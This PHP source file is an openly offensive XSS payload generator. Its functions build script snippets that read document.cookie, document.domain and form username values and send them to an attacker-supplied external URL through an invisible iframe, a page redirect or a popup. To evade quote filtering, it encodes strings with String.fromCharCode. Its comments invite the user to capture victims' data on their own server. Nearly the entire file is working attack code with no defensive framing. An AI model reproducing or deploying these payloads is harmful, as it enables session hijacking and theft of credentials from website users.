<?php

// Returns String.fromCharCode( with the array of chars that represents the
// original string. It's used to bypass the quotes restriction
function toCharArray($originalString)
{
  $charArray = str_split($originalString);
  $finalString = "";
  
  for($i = 0; $i < count($charArray)-1; $i++)
  {
    $c = $charArray[$i];
    $finalString .= ord($c).",";
  }
  $finalString .= ord($charArray[count($charArray)-1]);
  return "String.fromCharCode(".$finalString.")";
}

// Generate an URL with parameters. The parameters are javascript objects:
// $a = array(
//    "c" => "document.cookie",
//    "d" => "document.domain",
//    "u" => "document.forms[0].user.value"
//    );
function generateURL($url, $data, $quotes)
{
  $parameters = "";
  
  $n = 0;  
  foreach($data as $parameter => $value)
  {
    if($n == 0)
    {
      if(isset($quotes))
        $parameters .= toCharArray($url . "?" . $parameter . "=") . "+escape(" . $value . ")";
      else
        $parameters .= $url . "?".$parameter."='+escape(" . $value . ")";
      
      $n++;
    }
    else
      if(isset($quotes))
        $parameters .= "+" . toCharArray("&" . $parameter . "=") . "+escape(" . $value . ")";
      else
        $parameters .= "+'&" . $parameter . "='+escape(" . $value . ")";
  }
  
  return $parameters;
}


// Generates an iframe to send the data to an external server. The iframe is 
// invisible and can be generated without using quotes.
function sendWithIFRAME($url, $data, $quotes)
{
  $iframe = "<style>#y{display:none;}</style>"; // We want a invisible iframe, aren't we?  
  $iframe .= "<script>document.write(";
  
  $tmpI = "<iframe id=y src=";
  if(isset($quotes))
  {
    $tmpI = toCharArray($tmpI);
    $tmpI .= "+" . generateURL($url, $data, $quotes) . "+";
    $tmpI .= toCharArray("></iframe>");
    $iframe .= $tmpI;
  }
  else
  {
    $iframe .= "'";
    $tmpI .= "\"" . generateURL($url, $data, $quotes) . "+'\"></iframe>";;
    $iframe .= $tmpI . "'";
  }
  
  $iframe .= ");";  
  $iframe .= "</script>";  
  return $iframe;
}

// The quickest way. Redirect to your own server, capture the data and do
// whatever you want with the user :P
function sendWithRedirection($url, $data, $quotes)
{
  $red = "";  
  $red .= "<script>document.location=";
  
  if(isset($quotes))
    $red .= generateURL($url,$data,$quotes);
  else
    $red .= "'". generateURL($url,$data,$quotes) . "";
  
  $red .= ";</script>";  
  return $red;
}

// Try to open a popup. It will not work very well with the modern browsers...
function sendWithPopup($url, $data, $quotes)
{
  $popup = "";  
  $popup .= "<script>var w=window.open(";
  
  if(isset($quotes))
    $popup .= generateURL($url,$data,$quotes);
  else
    $popup .= "'". generateURL($url,$data,$quotes) . "";
  
  $popup .= ");</script>";  
  return $popup;
}
?>
